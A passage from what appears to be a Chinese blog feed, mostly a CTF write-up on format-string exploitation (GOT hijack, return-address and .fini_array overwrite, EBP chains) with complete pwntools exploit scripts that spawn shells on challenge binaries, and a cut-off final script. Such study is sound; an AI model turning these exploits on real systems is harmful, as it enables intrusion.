alt><br>修改apache2配置，让其也可以支持php</p><p>重启apache2:</p><pre><code>[root@localhost php-5.4.25]# /usr/local/apache2/bin/apachectl stopAH00558: httpd: Could not reliably determine the server&#39;s fully qualified domain name, using localhost.localdomain. Set the &#39;ServerName&#39; directive globally to suppress this message[root@localhost php-5.4.25]# /usr/local/apache2/bin/apachectl startAH00558: httpd: Could not reliably determine the server&#39;s fully qualified domain name, using localhost.localdomain. Set the &#39;ServerName&#39; directive globally to suppress this message</code></pre><p>restart 可能是无效的。</p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><h4 id="apache与php"><a href="#apache与php" class="headerlink" title="apache与php"></a>apache与php</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/Jp7nIv.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost htdocs]# vi index.php</code></pre><p>写一个php探针：</p><pre><code>&lt;?php        phpinfo();?&gt;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/zgJ5wo.png" srcset="/img/loading.gif" alt></p><h4 id="apache与MySQL"><a href="#apache与MySQL" class="headerlink" title="apache与MySQL"></a>apache与MySQL</h4><pre><code class="php">&lt;?php$link=mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;123456&#39;);if($link) echo &quot;Congratulations!!!!!!&quot;;mysql_close();?&gt;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/RQRH44.png" srcset="/img/loading.gif" alt></p><h3 id="phpadmin搭建"><a href="#phpadmin搭建" class="headerlink" title="phpadmin搭建"></a>phpadmin搭建</h3><pre><code>[root@localhost lamp1]# cp -r phpMyAdmin-4.1.4-all-languages /usr/local/apache2/htdocs/phpmyadmin</code></pre><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><pre><code>[root@localhost phpmyadmin]# cp config.sample.inc.php config.inc.php[root@localhost phpmyadmin]# vi config.inc.php</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/T9QoLf.png" srcset="/img/loading.gif" alt><br>访问测试：<br><img src="http://qiqianyun.chumen77.xyz/uPic/UK2Vd0.png" srcset="/img/loading.gif" alt></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串漏洞小总结（下）</title>
    <link href="/2020/04/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <url>/2020/04/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞小总结（下）"><a href="#格式化字符串漏洞小总结（下）" class="headerlink" title="格式化字符串漏洞小总结（下）"></a>格式化字符串漏洞小总结（下）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接着上一篇，这一篇主要记录一下对于这个漏洞的利用和ctf赛题中常见的套路和考法。</p><h2 id="格式化字符串在栈上"><a href="#格式化字符串在栈上" class="headerlink" title="格式化字符串在栈上"></a>格式化字符串在栈上</h2><h3 id="劫持got"><a href="#劫持got" class="headerlink" title="劫持got"></a>劫持got</h3><ul><li>每次 call libc 中的函数时都会去GOT表中查询来找出程序下一步要jmp的位址</li><li>可以通过 fmt 构造写入一个目标地址，改掉 GOT 表上的地址使得call该函数时变成jmp到我们要的目标地址去<br>例如 ：<br>将 printf 改成 system，原本 printf (“sh’’）就直接变成 system (“sh”),便可以拿到shell。<br>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/0G62iR.png" srcset="/img/loading.gif" alt><br>这一攻击过程可以分为以下几个步骤：</li><li>确定一下printf函数的GOT表的地址，如图中是<code>0x804a010</code></li><li>确定一下system函数的内存地址或者plt（通常都需要泄漏一下libc的基地址，然后加上偏移算出，当然也会遇到程序直接存在system函数，那么就是plt）</li><li>在栈上构造出printf函数GOT表的地址</li><li>利用fmt漏洞修改printf函数GOT表上的地址</li></ul><p>然后看一个例题：</p><h4 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy-echo"></a>inndy-echo</h4><h5 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h5><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h5 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp){  char s; // [esp+Ch] [ebp-10Ch]  unsigned int v4; // [esp+10Ch] [ebp-Ch]  v4 = __readgsdword(0x14u);  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  do  {    fgets(&amp;s, 256, stdin);    printf(&amp;s);  }  while ( strcmp(&amp;s, &quot;exit\n&quot;) );  system(&quot;echo Goodbye&quot;);  exit(0);}</code></pre><p>可以看到会无限的打印你输入的东西，那就意味着可以无限次触发这个漏洞。并且还有system这个函数，那可以直接找其plt。</p><h6 id="攻击思路："><a href="#攻击思路：" class="headerlink" title="攻击思路："></a>攻击思路：</h6><ul><li>在栈上放好printf函数的GOT表地址，并确定一下偏移</li><li>改这个GOT上的地址为system函数的plt</li><li>改好一会，传送一个<code>/bin/sh</code>，此时就会变成<code>system(/bin/sh)</code></li></ul><p>在执行的过程中需要注意一下，改GOT表上的值<strong>要单次printf多次写入</strong>，否则只改一般程序会出现无法预料的情况。还有就是需要注意一下<strong>字节对齐</strong>。</p><h5 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h5><pre><code>gdb-peda$ stack 0x200000| 0xffffd250 --&gt; 0xffffd26c (&quot;AAAA\n&quot;)0004| 0xffffd254 --&gt; 0x1000008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b0012| 0xffffd25c --&gt; 0x00016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f400020| 0xffffd264 --&gt; 0x80482e7 (&quot;__libc_start_main&quot;)0024| 0xffffd268 --&gt; 0xf63d4e2e0028| 0xffffd26c (&quot;AAAA\n&quot;)</code></pre><pre><code>gdb-peda$ fmtarg 0xffffd26cThe index of format argument : 7 (&quot;\%6$p&quot;)</code></pre><p>确定偏移是7，但需要注意字节对齐，打算一会在写payload时候，就<code>().ljust</code>补成0x20的<code>a</code>，也就是<code>offset = 7 + 0x20/4 = 15</code></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = 0x08048400for i in range(2):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,15+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x20,&#39;a&#39;) + p32(printf_got) + p32(printf_got+2)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p>换一种就是用pwntools中针对格式化字符串漏洞利用模块中的函数<code>fmtstr_payload</code>，面对32位，这种情况还是很好用的：</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010payload = fmtstr_payload(7,{printf_got : system_plt})io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/TxIVwQ.png" srcset="/img/loading.gif" alt><br>可以看一下其生成的payload，把目标地址信息放在开头，在64位是肯定是不可行的。（不过听说pwntools的新版本是已经支持64位了，但是本人一直没有更新成功，所以也没有测试）</p><h3 id="劫持retaddress"><a href="#劫持retaddress" class="headerlink" title="劫持retaddress"></a>劫持retaddress</h3><p>顾名思议，就是利用格式化串漏洞来修改函数的返回地址到我们想要jmp的地址。常见套路：</p><ul><li>jmp到带有<code>system(/bin/sh)</code> 的后门函数</li><li>不开nx保护，jmp到自己构造的shellcode上。</li><li>提前泄漏libc算出libc的base，jmp到onegadget地址</li></ul><p>看一个简单的例子：</p><h4 id="三个白帽-pwnme-k0"><a href="#三个白帽-pwnme-k0" class="headerlink" title="三个白帽 - pwnme-k0"></a>三个白帽 - pwnme-k0</h4><h5 id="保护和arch-1"><a href="#保护和arch-1" class="headerlink" title="保护和arch"></a>保护和arch</h5><pre><code>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>64位程序，且开启了RELRO保护，这样就无法修改got表了。</p><h5 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h5><p>这个程序实现了一个注册用户的功能，注册好后可以来展示用户信息，修改用户信息，和退出程序。其中在展示用户信息当中，存在格式化字符串漏洞：</p><pre><code class="c">int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9){  write(0, &quot;Welc0me to sangebaimao!\n&quot;, 0x1AuLL);  printf(&amp;formata, &quot;Welc0me to sangebaimao!\n&quot;);  return printf(&amp;a9 + 4);}</code></pre><p>并且发现其中输出的buf就是你输入的密码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/o8t1UX.png" srcset="/img/loading.gif" alt></p><p>还发现其中有个后门函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/lRHun0.png" srcset="/img/loading.gif" alt></p><p>会调用system函数给你shell，那攻击思路也就是去修改程序中某个函数的返回地址，直接返回到这里就拿到shell了。</p><h5 id="gdb调试："><a href="#gdb调试：" class="headerlink" title="gdb调试："></a>gdb调试：</h5><p>定位到这个存在漏洞的printf当中，确定一下：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsdWDQ.png" srcset="/img/loading.gif" alt><br>看一下此时的栈情况，输入的usename可以确定偏移是8，并且rdi也是指向了存放password的地址。</p><p>然后发现栈上也有很多栈的地址信息，当程序第二次运行到这里的时候，发现这里esp对应的地址信息也是不会变的。所以就可以通过泄漏这里的值来算出存放ret address的栈地址。</p><p>然后让程序运行到修改用户信息的函数，这下把ret address的point放到栈上，接着就可以开始修改ret address的值了。</p><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./pwnme_k0&#39;)# context.clear(arch = &#39;amd64&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;%0006$lx&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;11111111&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)# io.recvuntil(&#39;Welc0me to sangebaimao!\n&#39;)stack = int(io.recvline_contains(&#39;7f&#39;),16)print(stack)ret_add = stack - 0x38# system_add = 0x04008AApayload = &#39;%2218c%8$hn&#39;io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;2&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(p64(ret_add))io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(payload)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)io.interactive()</code></pre><h3 id="修改FINI-ARRAY区"><a href="#修改FINI-ARRAY区" class="headerlink" title="修改FINI_ARRAY区"></a>修改<code>FINI_ARRAY</code>区</h3><p>在上面的两个例子中可以发现,之所以能成功利用格式化字符串漏洞getshell,很多时候都是因为程序中存在循环，让我们可以多次触发格式化字符串漏洞。如果程序中不存在循环呢?利用ROP劫持函数返回地址到start可以实现；当存在格式化字符串漏洞时，使用这个漏洞也做到这一<br>点。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/NgjlR4.png" srcset="/img/loading.gif" alt><br>简单地说,一个程序在调用 main函数前会调用<code>.init</code>段代码和 <code>.init_array</code> 段的函数数组中每一个函数指针。同样的,main 函数结束后也会调用<code>.fini</code>段代码和 <code>.fini_arrary</code> 段的函数数组中的每一个函数指针。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/ioam7T.png" srcset="/img/loading.gif" alt><br>其中<code>FINI_ARRAY</code>区：程序结束需要经过这里，是可以修改一下这里的析构函数。修改<code>.fini_array</code>区的第一个元素为start，就可以实现让程序从头再来一次，也就又可以用一次漏洞。</p><p>需要注意的是,这个区的内容在再次从start开始执行后又会被修改。</p><h4 id="mma-ctf-2nd-2016-greeting"><a href="#mma-ctf-2nd-2016-greeting" class="headerlink" title="mma-ctf-2nd-2016-greeting"></a>mma-ctf-2nd-2016-greeting</h4><h5 id="保护和arch-2"><a href="#保护和arch-2" class="headerlink" title="保护和arch"></a>保护和arch</h5><pre><code>    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h5 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  char s; // [esp+1Ch] [ebp-84h]  char v5; // [esp+5Ch] [ebp-44h]  unsigned int v6; // [esp+9Ch] [ebp-4h]  v6 = __readgsdword(0x14u);  printf(&quot;Please tell me your name... &quot;);  if ( !getnline(&amp;v5, 64) )    return puts(&quot;Don&#39;t ignore me ;( &quot;);  sprintf(&amp;s, &quot;Nice to meet you, %s :)\n&quot;, &amp;v5);  return printf(&amp;s);}</code></pre><p>发现函数在触发格式化字符串漏洞以后就结束了，没有在调用其他的函数，也就无法利用GOT劫持或者修改ret addr。<br>再看下getnline函数：</p><pre><code class="c">size_t __cdecl getnline(char *s, int n){  char *v3; // [esp+1Ch] [ebp-Ch]  fgets(s, n, stdin);  v3 = strchr(s, 10);  if ( v3 )    *v3 = 0;  return strlen(s);}</code></pre><p>发现有了strlen的函数，并且其参数也是可以控制的。<br>这就有了攻击思路，在触发格式化字符串的漏洞时：</p><ul><li>修改<code>.fini_array</code>区的一个函数指针地址为start，让其重启跑一次程序</li><li>因为知道肯定会跑到strlen那里，所以在劫持strlen的GOT为system</li><li>待程序重新跑起来，就在传送一个<code>/bin/sh</code>即可</li></ul><p>注意的是,这个<code>.fini_array</code>区的内容在再次从start开始执行后又会被修改,且程序可读取的字节数有限,因此需要同时修改两个地址，也就是单次printf多次写入，这个题并且需要合理调整payload。</p><h5 id="gdb调试-1"><a href="#gdb调试-1" class="headerlink" title="gdb调试"></a>gdb调试</h5><p><img src="http://qiqianyun.chumen77.xyz/uPic/wRVcqD.png" srcset="/img/loading.gif" alt><br>这个题目因为前面有</p><pre><code class="c">sprintf(&amp;s, &quot;Nice to meet you, %s :)\n&quot;, &amp;v5);</code></pre><p>所以其栈上会放上<code>Nice to meet you,</code>的字符串，此时需要注意对齐。对齐后发现偏移为12，在写payload的时候可以使用单次printf多次写入的脚本，所以来<code>().ljust(0x32,&#39;a&#39;)</code> ,所以偏移需要加上<code>(0x32 - 2)/4</code> =  24 </p><h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;io = process(&#39;./greeting&#39;)# io = remote(&#39;111.198.29.45&#39;,42729)elf = ELF(&#39;./greeting&#39;)strlen_got = 0x08049A54fini_array = 0x08049934start = 0x080484F0system_plt = 0x08048490offset = 12def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultkey1 = 0x08048490prev = 18 #注意这个题在可控格式化字符串前有字符输出payload = &quot;&quot;for i in range(2):    payload +=fmt_short(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,24+i)     prev = (key1 &gt;&gt; i*16) &amp; 0xffffkey2 = 0x84F0for i in range(1):    payload +=fmt_short(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,26+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x32,&#39;a&#39;)payload += p32(strlen_got) + p32(strlen_got+2) +p32(fini_array)io.recvuntil(&#39;name...&#39;)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;name...&#39;)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h3 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h3><h4 id="绕过canary"><a href="#绕过canary" class="headerlink" title="绕过canary"></a>绕过canary</h4><p>可以利用fmt漏洞，任意读的特性，在有canary的程序中，算好偏移以后读出canary存的检验值（基本都是以00结尾比较好找），然后在buffer overflow 时，在对应位置填上canary检验值，即可绕过canary。</p><h4 id="printf家族的其他函数"><a href="#printf家族的其他函数" class="headerlink" title="printf家族的其他函数"></a>printf家族的其他函数</h4><p>首先要记得一点函数参数的入栈顺序，大多是从右到左依次入栈，在遇到其他的printf类函数，在确定偏移时，一定要要把握fmt是在栈上的那个位置，然后进行计算偏移（不能简单的利用pwndbg的fmtarg了）。</p><ul><li>fprintf：基本上一样，只是format string 不在第一参数，使得overwrite function table 时很难使用</li><li>sprintf：可以用%xxc 来造成新的buffer overflow </li></ul><h4 id="劫持-stack-chk-fail"><a href="#劫持-stack-chk-fail" class="headerlink" title="劫持__stack_chk_fail"></a>劫持<code>__stack_chk_fail</code></h4><ul><li>在无法 stack overflow 也没有其它函数可以劫持时，可以使用修改<code>__stack_chk_fail</code> 的 G0T 并且破坏 canary 使这个函数被call，然后jmp想要的目标地址</li><li>在只有一次 stack overflow+fmt 时可以将<code>__stack_chk_fail</code>改成直接ret ，这样stack overflow 时可以无视canary ，也可以放上ROP链，进而进入之后的ROP。</li></ul><h2 id="格式化字符串不在栈上"><a href="#格式化字符串不在栈上" class="headerlink" title="格式化字符串不在栈上"></a>格式化字符串不在栈上</h2><p>有时候并不会这么刚好 format string 的 buf 在栈上当其在 data, bss 或是 heap 上的情况，无法在 stack 中放上一个 address 给任意读写的时候，可以使用在  stack 上现有的 pointer 进行写值。其中最常用的就是栈上现有的EBP链。</p><h3 id="EBP链"><a href="#EBP链" class="headerlink" title="EBP链"></a>EBP链</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/Y9ykIj.png" srcset="/img/loading.gif" alt></p><p>正如这个图，当一个程序完成了由main—&gt;A—&gt;B的函数调用，栈上就会存在一个EBP链，像图中的ebp3(B)—&gt;ebp2(A)—&gt;ebp1(main)，然后</p><ul><li>通过找准offset1(算一下ebp3与fmt字符串距离)对EBP2使用%hhn，就可以修改到EBP1的最低位，使得EBP1在一个256的范围内进行变化，可以改成你想要修改的栈内存单元指针（比如ret address的栈指针）。</li><li>改写好EBP1后，找准offset2 (算一下EBP2与fmt字符串距离)再对EBP1使用%hhn或者%hn，即可完成对你想要修改的地址的写值。</li></ul><p>简单来说，这个攻击过程就是第一次使用漏洞是构造出我们要读写的地址，再一次则是对前面构造出来的地址进行任意读写。但需要注意的是，<strong>在这个过程当中一定要学会对栈上的已有数据的灵活的运用</strong>。</p><p>接下来看一个题来仔细分析一下</p><h4 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining-playfmt"></a>hitcontraining-playfmt</h4><h5 id="保护和arch-3"><a href="#保护和arch-3" class="headerlink" title="保护和arch"></a>保护和arch</h5><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments</code></pre><p>没有任何保护。</p><h5 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code class="c">int do_fmt(){  int result; // eax  while ( 1 )  {    read(0, buf, 0xC8u);    result = strncmp(buf, &quot;quit&quot;, 4u);    if ( !result )      break;    printf(buf);  }  return result;}</code></pre><p>其中看到buf在bss段：<br><img src="http://qiqianyun.chumen77.xyz/uPic/HRvwJA.png" srcset="/img/loading.gif" alt><br>这就是不在栈上，不能跟前面的题目一样，直接在栈上写上地址，然后来完成攻击。</p><p>上层有main 和play函数，一共三层，且在第三层的do-fmt函数存在格式化字符串漏洞，让我们很方便的用ebp链来完成攻击。然后，有无限次的触发这个漏洞的机会。</p><p>攻击思路 ：因为没有开nx保护，可以用shellcode进行攻击。修改某个函数返回地址，然后提前在可控的buf合适的地方摆上shellcode，然后跳上去即可。</p><h5 id="gdb调试-2"><a href="#gdb调试-2" class="headerlink" title="gdb调试"></a>gdb调试</h5><p>定位到printf函数处：</p><pre><code>gdb-peda$ b *0x0804854FBreakpoint 1 at 0x804854f</code></pre><p>可以看一下此时的栈情况：<br><img src="http://qiqianyun.chumen77.xyz/uPic/lYT98n.png" srcset="/img/loading.gif" alt><br>esp寄存器：<br><img src="http://qiqianyun.chumen77.xyz/uPic/vpsR9A.png" srcset="/img/loading.gif" alt><br>这里就把<code>0xffffd338</code>叫做ebp3，<code>0xffffd348</code>为ebp2，<code>0xffffd358</code>为ebp1。</p><p>第一次修改：对ebp2使用<code>%xxhhn</code>修改ebp1为do-fmt函数的retaddr <code>0xffffd33c</code>的<strong>栈指针</strong>（这个栈指针可以通过leak一个栈地址，然后根据偏移算出来）</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/x0EjmA.png" srcset="/img/loading.gif" alt></p><p>第二次修改 ： 对ebp1使用<code>%xxhn</code> 修改retaddr <code>0x80485ad</code> 为你在buf处提前摆上的shellcode</p><p>这样程序在退出这个do-fmt函数就会jmp到shellcode上，这样就拿到shell了。</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./ebp&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,29994)buf = 0x0804a080 + 0x40 #0x804a0c0raw_input(&#39;-&gt;&#39;)io.sendline(&#39;%4$p&#39;)ret_stack_addr = int(io.recv(10),16) - 28print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))key1 = int(str(hex(ret_stack_addr))[-2:],16)key2 = 0xa0c0payload = &#39;%{}c%4$hhn&#39;.format(key1)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recv()payload = &#39;%{}c%12$hn&#39;.format(key2)payload = payload.ljust(0x40) payload +=  asm(shellcraft.sh())io.sendline(payload)io.interactive()</code></pre><p>这个题目就是很单纯的直接利用ebp链进行攻击即可。</p><p>然后再看一个有点不一样的题目：</p><h3 id="inndy-echo3"><a href="#inndy-echo3" class="headerlink" title="inndy-echo3"></a>inndy-echo3</h3><h4 id="保护和arch-4"><a href="#保护和arch-4" class="headerlink" title="保护和arch"></a>保护和arch</h4><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h4 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/Z7hCmN.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/OawGHm.png" srcset="/img/loading.gif" alt></p><p>这一处会让栈结构的情况变得无法预测。然后进入hardfmt：</p><pre><code class="c">  for ( i = 0; i &lt;= 4; ++i )  {    read(0, buff, 0x1000u);    printf(buff);  }</code></pre><p>这一处存在fmt漏洞，且往下看整个程序感觉没什么好利用的，没什么后门函数。那攻击思路就可以是：<strong>改printf的got表，然后在第5次传过去<code>/bin/sh</code>即可。</strong><br>（这个题目思路还是很简单的，但是栈的随机化，还有因为这个次数的限制，在实际操作过程中，要充分的利用每一次格式化字符串漏洞，让这个题目不是很容易做）</p><h4 id="gdb分析"><a href="#gdb分析" class="headerlink" title="gdb分析"></a>gdb分析</h4><p>定位到漏洞printf函数处：<br><img src="http://qiqianyun.chumen77.xyz/uPic/KPo7Ve.png" srcset="/img/loading.gif" alt><br>会发现这个情况是没有<strong>构成ebp链</strong>的，这个时候就需要咱们自己来仔细观察栈上的数据，然后来挑选合适的栈数据来进行利用。</p><p>因为栈情况不一样，可以选择最适合我们利用漏洞的栈空间来进行分析，这样做起来会简单一些。</p><p>我自己选择在偏移在43的时候开始进行分析，想办法来利用这个漏洞：<br><img src="http://qiqianyun.chumen77.xyz/uPic/8gciU0.png" srcset="/img/loading.gif" alt><br>仔细看下此时的栈情况 ，然后再次仔细分析下我们的目标 ：</p><ul><li>泄漏libc基址，计算出system的内存地址。</li><li>在栈上构造出printf的got地址和printf的got+2的地址（0x0804a014和0x0804a016）</li><li>在构造的got地址上，开始写system地址<br>由于这个漏洞可以的用的次数最多是4次，所以要尽可能利用每一次。</li></ul><p>如上图所示，很简单就可以泄漏出libc基址。<br>但是接下来怎么构造printf的got地址和printf的got地址+2的地址就有点难了。</p><p>此时注意图上前两个红框，可以发现把前二个红框<strong>虽不是ebp</strong>的链，但是这也是<strong>成一个链</strong>可以利用了。然后可以把第二个红框的两个地址修改为 第一个红框的两个栈指针：</p><p>这里可以用gdb直接来手动设置，让咱们上来就写exp调试还是挺费劲的：</p><pre><code>gdb-peda$ set *0xffbe5e6c = 0xffbe5d54gdb-peda$ set *0xffbe5e64 = 0xffbe5d60</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/KIrnCk.png" srcset="/img/loading.gif" alt></p><p>这个过程中在泄漏目标栈地址以后，是可以通过一次printf函数写入2次地址，实现这个栈情况的。</p><p>接着就可以构造got地址和got+2地址：</p><pre><code>gdb-peda$ set *0xffbe5d60  = 0x0804a016gdb-peda$ set *0xffbe5d54  = 0x0804a014</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hma5RY.png" srcset="/img/loading.gif" alt></p><p>然后就可以利用对got地址和got+2地址使用<code>%xhn</code>,写system的内存地址上printf的got了：</p><pre><code>0120| 0xffbe5d88 --&gt; 0xffbe5e6c --&gt; 0xffbe5d54 --&gt; 0x804a014 --&gt; 0xf7e0cda0 (&lt;__libc_system&gt;:    sub    esp,0xc)</code></pre><p>写好以后，再传过去一下<code>/bin/sh</code>即可。</p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch =&#39;i386&#39;import timeelf = ELF(&#39;./echo3&#39;)debug = 1while True:    if debug :        io = process(&#39;./echo3&#39;)        libc = elf.libc    else:        io = remote(&#39;node3.buuoj.cn&#39;,25057)        libc = ELF(&#39;./libc-2.23.so.i386&#39;)    payload = &#39;%43$pA%30$pA%47$p&#39;    io.sendline(payload)    address = io.recvline().strip()    if address[-3:] == &#39;637&#39;:        if address[7:10] == &#39;637&#39;:            libc_base = int(address[2:10],16) - 247 - libc.symbols[&#39;__libc_start_main&#39;]            tag1_stack_point = int(address[13:21],16) - 0x118            tag2_stack_point = int(address[13:21],16) - 0x104 - 0x8            system_addr = libc_base + libc.symbols[&#39;system&#39;]            print(&#39;system_addr  -&gt;&#39; + hex(system_addr))            print(&#39;tag1_stack_point -&gt;&#39; + hex(tag1_stack_point))            print(&#39;tag2_stack_point -&gt;&#39; + hex(tag2_stack_point))            break    else :        io.close()        continuedef fmtshort(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultdef fmtbyte(prev,val,idx,byte = 1):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;    return resultprintf_got = 0x0804a014key1 = int(hex(tag1_stack_point)[-4:],16)key2 = int(hex(tag2_stack_point)[-4:],16)info(&#39;--------change the two points to tag_stack_point:-------&#39;)# raw_input(&#39;-&gt;&#39;)prev = 0payload = &quot;&quot;for i in range(1):    payload +=fmtshort(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,30+i)     prev = (key1 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,31+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;1111&#39;io.sendline(payload)io.recvuntil(&#39;1111&#39;)info(&#39;--------change got_table to printf_got:-------&#39;)prev = 0 payload = &quot;&quot;key3 = 0x14key4 = 0x16for i in range(1):    payload +=fmtbyte(prev,(key3 &gt;&gt; 8*i) &amp; 0xff,87+i)     prev = (key3 &gt;&gt; i*8) &amp; 0xfffor i in 